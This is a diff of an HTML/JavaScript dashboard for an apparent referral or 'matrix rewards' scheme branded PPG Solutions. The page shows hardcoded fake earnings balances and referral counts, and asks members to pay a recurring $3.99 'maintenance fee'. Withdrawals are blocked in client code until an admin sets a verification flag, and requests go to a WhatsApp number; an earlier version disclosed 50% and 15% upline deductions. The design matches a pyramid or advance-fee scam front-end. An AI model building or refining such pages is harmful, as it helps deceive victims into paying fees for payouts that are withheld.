@@ -16,6 +16,7 @@
             --success-green: #22C55E;
             --input-bg: #1A2026;
             --danger-red: #EF4444;
+            --warning-orange: #F5A623;
         }
 
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; -webkit-tap-highlight-color: transparent; }
@@ -26,6 +27,15 @@
         .logo-text { font-size: 18px; font-weight: 800; }
         .logo-text span { color: var(--accent-gold); }
 
+        /* KYC Verification Badges */
+        .status-badge-container { margin-bottom: 16px; }
+        .verification-badge { display: flex; align-items: center; gap: 8px; border-radius: 6px; padding: 10px 14px; font-size: 12px; font-weight: 600; }
+        .verification-badge.status-verified { background: rgba(34, 197, 94, 0.1); border: 1px solid rgba(34, 197, 94, 0.3); color: var(--success-green); }
+        .verification-badge.status-pending { background: rgba(245, 166, 35, 0.1); border: 1px solid rgba(245, 166, 35, 0.3); color: var(--accent-gold); }
+        .status-dot { width: 6px; height: 6px; border-radius: 50%; animation: blink 2s infinite; }
+        .status-verified .status-dot { background: var(--success-green); }
+        .status-pending .status-dot { background: var(--warning-orange); }
+
         /* Wallet Center Design */
         .wallet-card { background-color: var(--bg-card); border: 1px solid var(--border-color); border-radius: 12px; padding: 20px; margin-bottom: 16px; }
         .wallet-label { font-size: 12px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.5px; }
@@ -34,6 +44,13 @@
         
         .btn-action { display: block; text-align: center; background-color: var(--accent-blue); color: #FFF; text-decoration: none; padding: 12px; border-radius: 6px; font-size: 13px; font-weight: 600; border: none; cursor: pointer; }
         .btn-action.gold-rev { background-color: transparent; border: 1px solid var(--accent-gold); color: var(--accent-gold); }
+
+        /* Performance Metrics Metrics */
+        .metrics-grid { display: grid; grid-template-columns: 1fr; gap: 12px; margin-bottom: 16px; }
+        .metric-tile { background-color: var(--bg-card); border: 1px solid var(--border-color); border-radius: 8px; padding: 14px; display: flex; justify-content: space-between; align-items: center; }
+        .metric-meta h4 { font-size: 12px; color: var(--text-muted); font-weight: 500; text-transform: uppercase; letter-spacing: 0.3px; }
+        .metric-meta p { font-size: 18px; font-weight: 700; color: var(--text-main); margin-top: 2px; }
+        .metric-count-badge { background: rgba(0, 102, 255, 0.1); border: 1px solid rgba(0, 102, 255, 0.25); color: var(--accent-blue); font-size: 14px; font-weight: 700; padding: 4px 12px; border-radius: 20px; }
 
         /* Meta Rows */
         .info-card { background-color: var(--bg-card); border: 1px solid var(--border-color); border-radius: 8px; padding: 16px; margin-bottom: 16px; }
@@ -57,6 +74,7 @@
         .policy-callout span { color: var(--danger-red); font-weight: 600; }
 
         @keyframes fadeIn { from { opacity: 0; transform: translateY(-5px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
     </style>
 </head>
 <body>
@@ -68,23 +86,40 @@
             <div style="font-size: 12px; color:var(--text-muted);" id="userDisplayLabel">ID: Generating...</div>
         </header>
 
+        <div class="status-badge-container" id="kycStatusContainer">
+            <div class="verification-badge status-pending" id="kycBadge">
+                <div class="status-dot"></div>
+                <span id="kycStatusText">Account Status: Pending Review & Verification</span>
+            </div>
+        </div>
+
         <div class="wallet-card">
-            <div class="wallet-label">Accumulated Referral Earnings</div>
-            <div class="wallet-balance">$42.50 <span style="font-size: 14px; color:var(--text-muted); font-weight:400;">USD</span></div>
+            <div class="wallet-label">Total Performance & Referral Earnings Balance</div>
+            <div class="wallet-balance">$<span id="displayWalletBalance">0.00</span> <span style="font-size: 14px; color:var(--text-muted); font-weight:400;">USD</span></div>
             <div class="wallet-actions">
                 <button class="btn-action" onclick="toggleViewBlock('depositPanel')">Renew Licence</button>
                 <button class="btn-action gold-rev" onclick="toggleViewBlock('withdrawalPanel')">Withdraw Funds</button>
             </div>
         </div>
 
+        <div class="metrics-grid">
+            <div class="metric-tile">
+                <div class="metric-meta">
+                    <h4>Direct Referrals Linked</h4>
+                    <p style="font-size: 11px; color: var(--text-muted); font-weight: normal; margin-top: 2px;">Your active downline structure tracking</p>
+                </div>
+                <div class="metric-count-badge" id="referralCountDisplay">0</div>
+            </div>
+        </div>
+
         <div class="overlay-form-panel" id="depositPanel">
             <div class="form-title-row">Extend Membership Subscription</div>
-            <p style="font-size:12px; color:var(--text-muted); margin-bottom:12px;">Remit the monthly payment of <strong>$3.99</strong> to our support lines to prolong system link operations.</p>
-            <a href="payment.html" class="btn-action" style="background-color: var(--accent-gold); color:#000;">View Corporate Remittance Targets</a>
+            <p style="font-size:12px; color:var(--text-muted); margin-bottom:12px;">Remit the regular system platform maintenance fee of <strong>$3.99</strong> directly to ensure uninterrupted matrix rewards allocations.</p>
+            <a href="payment.html" class="btn-action" style="background-color: var(--accent-gold); color:#000;">Proceed to Payment Verification Targets</a>
         </div>
 
         <div class="overlay-form-panel" id="withdrawalPanel">
-            <div class="form-title-row">Request Referral Settlement</div>
+            <div class="form-title-row">Request Earnings Liquidation</div>
             <form onsubmit="dispatchWithdrawalTicket(event)">
                 <div class="input-node">
                     <label>Settlement Payment Stream</label>
@@ -119,11 +154,11 @@
 
                 <div class="input-node">
                     <label>Volume to Liquidate ($ USD)</label>
-                    <input type="number" id="w_amt" placeholder="Minimum $10.00" required>
+                    <input type="number" id="w_amt" placeholder="Minimum $10.00" step="0.01" required>
                 </div>
 
                 <div class="policy-callout">
-                    ⚠️ <span>Ecosystem Policy Consent Rule:</span> By submitting this ticket, you authorize a 15% settlement credit deduction directly to your parent referrer, alongside a 50% system tracking processing fee deduction.
+                    ⚠️ <span>Ecosystem Policy Consent Rule:</span> Earnings withdrawals are authorized for processing strictly upon confirmation of a verified profile status through the core administration parameters.
                 </div>
 
                 <button type="submit" class="btn-action" style="width:100%; background-color: var(--success-green);">Transmit Liquidation Ticket</button>
@@ -131,24 +166,33 @@
         </div>
 
         <div class="info-card">
-            <div class="info-title">Personal Identity Network Link</div>
-            <div class="info-desc">Distribute your dynamic credential token to clear ongoing node requirements.</div>
+            <div class="info-title">Personal Referral Program Token Link</div>
+            <div class="info-desc">Distribute this link tracking address to invite team partners and credit continuous 15% recurring reward volumes to your asset ledger.</div>
             <div class="copy-box">
                 <span class="copy-url" id="linkDisplayString">Generating link trace...</span>
-                <button class="mini-btn" onclick="copyNetworkLink()">Copy</button>
+                <button class="mini-btn" onclick="copyNetworkLink()">Copy Link</button>
             </div>
         </div>
 
         <div class="info-card">
             <div class="info-title">Ecosystem Support Hub</div>
-            <p class="info-desc" style="margin-bottom:12px;">Contact system validation tables to verify tracking adjustments or update account status parameters.</p>
+            <p class="info-desc" style="margin-bottom:12px;">Contact system validation points to submit operational documents or request updates to validation records.</p>
             <a href="https://wa.me/2348130500659" target="_blank" class="btn-action" style="background-color:transparent; border:1px solid var(--border-color); color:var(--text-main);">Open Live WhatsApp Support</a>
         </div>
 
     </div>
 
     <script>
+        // System Tracking Data Parameters Mock Configuration Database
+        // Modify these variable assignments manually or integrate with your cloud API response object
+        var USER_ACCOUNT_DATABASE = {
+            walletBalance: 42.50,         // Cumulative referral and tracking trading rewards balance volume
+            totalReferralsCount: 3,       // Absolute count of verified user nodes attributed to this registration link
+            isKycVerifiedByAdmin: false   // Core structural validation toggle flag: set true when admin approves
+        };
+
         document.addEventListener("DOMContentLoaded", function() {
+            // Initialization Logic for Identity Identifiers
             var userSeed = localStorage.getItem('ppg_username');
             if (!userSeed) {
                 userSeed = "PPG" + Math.floor(1000 + Math.random() * 9000);
@@ -165,21 +209,46 @@
             
             var targetRoot = window.location.href.split('?')[0].replace('dashboard.html', 'index.html');
             document.getElementById("linkDisplayString").innerText = targetRoot + "?ref=" + window.userRefID;
+
+            // System Registry Core Sync
+            renderDynamicSystemMetrics();
         });
+
+        function renderDynamicSystemMetrics() {
+            // Populate Balance Fields
+            document.getElementById("displayWalletBalance").innerText = USER_ACCOUNT_DATABASE.walletBalance.toFixed(2);
+            
+            // Populate Affiliate Counts
+            document.getElementById("referralCountDisplay").innerText = USER_ACCOUNT_DATABASE.totalReferralsCount;
+
+            // Enforce Strict Admin Panel Verification Displays
+            var badgeElement = document.getElementById("kycBadge");
+            var statusTextElement = document.getElementById("kycStatusText");
+
+            if (USER_ACCOUNT_DATABASE.isKycVerifiedByAdmin === true) {
+                badgeElement.className = "verification-badge status-verified";
+                statusTextElement.innerText = "Account Status: Verified Partner Node";
+            } else {
+                badgeElement.className = "verification-badge status-pending";
+                statusTextElement.innerText = "Account Status: Pending KYC Review & Verification";
+            }
+        }
 
         function toggleViewBlock(blockId) {
             var target = document.getElementById(blockId);
-            var states = target.style.display === "block";
+            var isAlreadyVisible = target.style.display === "block";
             
             document.getElementById("depositPanel").style.display = "none";
             document.getElementById("withdrawalPanel").style.display = "none";
             
-            if(!states) { target.style.display = "block"; }
+            if (!isAlreadyVisible) { 
+                target.style.display = "block"; 
+            }
         }
 
         function adjustFormFields() {
             var selector = document.getElementById("w_type").value;
-            if(selector === "Crypto Stream") {
+            if (selector === "Crypto Stream") {
                 document.getElementById("cryptoFormNodes").style.display = "block";
                 document.getElementById("bankFormNodes").style.display = "none";
             } else {
@@ -191,29 +260,35 @@
         function copyNetworkLink() {
             var content = document.getElementById("linkDisplayString").innerText;
             navigator.clipboard.writeText(content).then(function() {
-                alert("Network referral link successfully copied to clipboard.");
+                alert("Tracking referral address link saved to clipboard data.");
             });
         }
 
         function dispatchWithdrawalTicket(e) {
             e.preventDefault();
+
+            // Intercept attempts if structural verification criteria is absent
+            if (USER_ACCOUNT_DATABASE.isKycVerifiedByAdmin !== true) {
+                alert("Settlement Operations Rejected: Your profile credentials must be fully verified and approved by the administration panel before processing asset liquidation requests.");
+                return;
+            }
             
             var streamType = document.getElementById("w_type").value;
             var volume = document.getElementById("w_amt").value;
             var pathDetails = "";
             
-            if(streamType === "Crypto Stream") {
-                pathDetails = "TRC20 Wallet: " + document.getElementById("w_crypto_addr").value;
+            if (streamType === "Crypto Stream") {
+                pathDetails = "TRC20 Wallet Address: " + document.getElementById("w_crypto_addr").value;
             } else {
-                pathDetails = "Bank Name: " + document.getElementById("w_bank_name").value + " | Account: " + document.getElementById("w_bank_num").value;
+                pathDetails = "Bank Target: " + document.getElementById("w_bank_name").value + " | Account Number: " + document.getElementById("w_bank_num").value;
             }
             
-            var textPayload = "Hello PPG Solutions Support, I am submitting a liquidation ticket for my referral marketing earnings:\n\n" +
-                              "Member Account Tracking ID: " + window.userRefID + "\n" +
-                              "Settlement Route: " + streamType + "\n" +
-                              "Destination Vector Data: " + pathDetails + "\n" +
-                              "Requested Gross Balance Volume: $" + volume + " USD\n\n" +
-                              "Policy Declaration Acknowledged: I consent to the 15% upline credit routing split and the 50% processing system charge rule.";
+            var textPayload = "Hello PPG Solutions Support Desk,\n\nI am presenting an earnings liquidation application from my verified Partner Console profile:\n\n" +
+                              "Tracking Profile Account ID: " + window.userRefID + "\n" +
+                              "Settlement Framework Route: " + streamType + "\n" +
+                              "Target Destination Metrics: " + pathDetails + "\n" +
+                              "Gross Liquidation Volume Requested: $" + volume + " USD\n\n" +
+                              "Account Status Security Check: Verified Profile Node Reference.";
                               
             var supportLineURL = "https://wa.me/2348130500659?text=" + encodeURIComponent(textPayload);
             window.open(supportLineURL, '_blank');
